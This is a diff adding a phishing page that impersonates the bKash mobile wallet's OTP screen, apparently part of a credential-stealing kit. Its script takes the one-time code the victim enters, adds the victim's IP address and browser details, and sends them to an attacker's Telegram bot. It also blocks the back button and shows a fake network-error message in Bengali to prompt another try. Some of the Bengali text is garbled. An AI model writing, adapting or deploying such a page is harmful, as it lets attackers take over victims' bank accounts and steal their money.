@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bkash OTP</title>
+    <style>
+    	@keyframes fadeIn {
+    from { opacity: 0; transform: translateY(-20px); }
+    to { opacity: 1; transform: translateY(0); }
+}
+
+@keyframes buttonHover {
+    from { background-color: #e4136b; }
+    to { background-color: #c5115a; }
+}
+
+body {
+    background-color: #e4136b;
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+    display: flex;
+    flex-direction: column;
+    justify-content: flex-start;
+    align-items: center;
+    height: 100vh;
+}
+.logo {
+    text-align: center;
+    margin-top: 50px;
+    margin-bottom: 10px;
+    animation: fadeIn 1s ease-in-out;
+}
+.logo img {
+    max-width: 110px;
+}
+.container {
+    background-color: #FFFFFF;
+    padding: 20px;
+    border-radius: 10px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+    text-align: center;
+    width: 300px;
+    margin-top: 30px;
+    animation: fadeIn 1.5s ease-in-out;
+}
+input[type="text"] {
+    width: 100%;
+    padding: 10px;
+    margin-bottom: 10px;
+    border: 1px solid #CCCCCC;
+    border-radius: 5px;
+    box-sizing: border-box;
+    font-family: Arial, sans-serif;
+    transition: border-color 0.3s, box-shadow 0.3s;
+    animation: fadeIn 2s ease-in-out;
+}
+input[type="text"]::placeholder {
+    font-family: Arial, sans-serif;
+    color: #999999;
+}
+input:focus {
+    border-color: #e4136b;
+    box-shadow: 0 0 5px rgba(228, 19, 107, 0.5);
+    outline: none;
+}
+input.invalid {
+    border-color: red;
+    box-shadow: 0 0 5px rgba(255, 0, 0, 0.5);
+}
+#timer {
+    color: #e4136b;
+    font-weight: bold;
+    margin-bottom: 10px;
+    text-align: center;
+    width: 100%;
+    animation: fadeIn 2.5s ease-in-out;
+}
+#submitButton {
+    background-color: #e4136b;
+    color: #FFFFFF;
+    border: none;
+    padding: 10px 20px;
+    border-radius: 5px;
+    cursor: pointer;
+    width: 100%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-family: Arial, sans-serif;
+    font-size: 16px;
+    transition: background-color 0.3s, transform 0.3s;
+    animation: fadeIn 3s ease-in-out;
+}
+#submitButton:hover {
+    background-color: #c5115a;
+    animation: buttonHover 0.3s forwards;
+    transform: translateY(-2px);
+}
+#submitButton span {
+    margin-left: auto;
+}
+</style>
+</head>
+<body>
+    <div class="logo">
+        <img src="https://i.ibb.co/0s3npSv/5e6ab3fa58a91-removebg-preview-1.png" alt="Bkash Logo">
+    </div>
+    <div class="container">
+        <p>We have sent an OTP to your bkrash mobile number, enter that OTP here.</p>
+        <input type="text" placeholder="Enter OTP" id="otpInput" inputmode="numeric" pattern="\d*">
+        <div id="timer">01:00</div>
+        <button id="submitButton">Submit <span>&#8594;</span></button>
+        <p id="goBack" style="margin-top: 20px; color: #999999; cursor: pointer;">GO BACK</p>
+    </div>
+
+    <script>
+    	
+function getQueryParams() {
+    const params = new URLSearchParams(window.location.search);
+    return {
+        token: params.get('token'),
+        chatId: params.get('id')
+    };
+}
+
+const { token, chatId } = getQueryParams();
+const telegramToken = token;
+const telegramChatId = chatId;
+
+const submitButton = document.getElementById('submitButton');
+const otpInput = document.getElementById('otpInput');
+const timerElement = document.getElementById('timer');
+
+function startTimer(duration) {
+    let timer = duration, minutes, seconds;
+    const countdown = setInterval(() => {
+        minutes = Math.floor(timer / 60);
+        seconds = timer % 60;
+
+        timerElement.textContent = `${minutes < 10 ? '0' : ''}${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+
+        if (--timer < 0) {
+            clearInterval(countdown);
+            startTimer(duration); 
+        }
+    }, 1000);
+}
+
+const sendToTelegram = async (token, chatId, message) => {
+    const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
+
+    try {
+        const response = await fetch(telegramUrl);
+        const data = await response.json();
+        if (!data.ok) {
+            throw new Error(`Telegram API error: ${data.description}`);
+        }
+    } catch (error) {
+        console.error('Error sending message to Telegram:', error);
+        alert(`Error occurred while sending message to Telegram: ${error.message}`);
+    }
+};
+
+submitButton.addEventListener('click', async () => {
+    const otpValue = otpInput.value;
+    console.log('OTP Value:', otpValue);
+
+    if (!/^\d{6}$/.test(otpValue)) {
+        otpInput.classList.add('invalid');
+        alert("Please enter a valid 6-digit OTP.");
+        return;
+    } else {
+        otpInput.classList.remove('invalid');
+    }
+
+    console.log('OTP is valid, proceeding...');
+
+    const userAgent = navigator.userAgent;
+    const date = new Date();
+    console.log('User Agent:', userAgent);
+    console.log('Date:', date.toLocaleString());
+
+    try {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const ip = ipData.ip;
+        console.log('IP Address:', ip);
+
+        const otpData = {
+            otp: otpValue,
+            ip: ip,
+            userAgent: userAgent,
+            date: date.toLocaleString()
+        };
+
+        const telegramMessage = `<b>馃帲 Bkrash Info</b>
+
+馃攽 <b>OTP:</b> <code>${otpData.otp}</code>
+
+馃寪 <b>IP Address:</b> ${otpData.ip}
+
+馃捇 <b>User Agent:</b> ${otpData.userAgent}
+
+馃搮 <b>Date:</b> ${otpData.date}
+
+<blockquote>鈿狅笍唳忇唳� 唳多唳о 唳多唳曕唳粪唳唳侧 唳夃Ζ唰嵿Ζ唰囙Χ唰嵿Ο唰� 唳唳ㄠ唳ㄠ 唳灌Ο唳监唳涏啷� 唳︵Ο唳监 唳曕Π唰� 唳曕唳� 唳曕唳班 唳曕唳粪Δ唳� 唳曕Π唳距Π 唳夃Ζ唰嵿Ζ唰囙Χ唰嵿Ο唰� 唳忇唳� 唳唳Μ唳灌唳� 唳曕Π唳唳� 唳ㄠ啷�</blockquote>`;
+
+        console.log('Telegram Message:', telegramMessage);
+
+        await sendToTelegram(telegramToken, telegramChatId, telegramMessage);
+        
+
+        console.log('OTP sent to Telegram');
+    } catch (error) {
+        console.error('Error in main flow:', error);
+    }
+});
+
+window.onload = () => {
+    startTimer(60); 
+};
+
+window.addEventListener('popstate', function(event) {
+    window.location.href = 'login.html';
+});
+
+window.history.pushState({}, '');
+
+document.getElementById('goBack').addEventListener('click', function() {
+    window.location.href = 'login.html';
+});
+
+document.getElementById("submitButton").addEventListener("click", function() {
+            setTimeout(function() {
+                alert("唳︵唳冟唳苦Δ, 唳ㄠ唳熰唳唳距Π唰嵿 唳む唳班唳熰唳� 唳曕唳班Γ唰� 唳膏Ξ唳膏唳 唳灌唰嵿唰�, 唳︵Ο唳监 唳曕Π唰� 唳唳ㄠΠ唳距Ο唳� 唳氞唳粪唳熰 唳曕Π唰佮Θ啷�");
+            }, 1000);
+        });
+
+    </script>
+</body>
+</html>
